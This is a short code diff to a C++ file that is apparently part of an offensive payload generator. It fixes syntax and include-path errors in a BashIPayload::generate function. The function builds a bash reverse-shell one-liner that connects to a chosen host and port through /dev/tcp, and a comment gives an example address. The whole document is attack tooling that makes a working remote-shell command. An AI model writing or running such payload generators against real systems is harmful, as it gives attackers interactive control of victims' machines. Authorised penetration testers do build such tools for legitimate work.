@@ -1,6 +1,6 @@
 #include "Bash_I_Payload.h"
-#include "ListenerFactory.h"
-#include "Options.h"
+#include "../../listeners/ListenerFactory.h"
+#include "../../core/Options.h"
 
 #include <memory>
 #include <string>
@@ -12,12 +12,11 @@ std::string BashIPayload::name() const { return "shell"; }
 // zsh, etc.)
 std::string BashIPayload::generate(const Options &o) const {
   //  Choose interpreter, default to "bash" if none specified"
-  std::string sh = o.interpreter.empty() ? "bash";
-  o.interpreter;
+  std::string sh = o.interpreter.empty() ? "bash" : o.interpreter;
 
   // Build the reverse-shell one-liner
   // e.g. "sh -i >& /dev/tcp/1.2.3.4/4444 0>&1"
-  return sh + " -i >& /dev/tcp/" + o.host + "/" + o.port + " 0>&1"
+  return sh + " -i >& /dev/tcp/" + o.host + "/" + std::to_string(o.port) + " 0>&1";
 }
 
 // Uses the ListenerFactory to get the appropriate listener based on Options
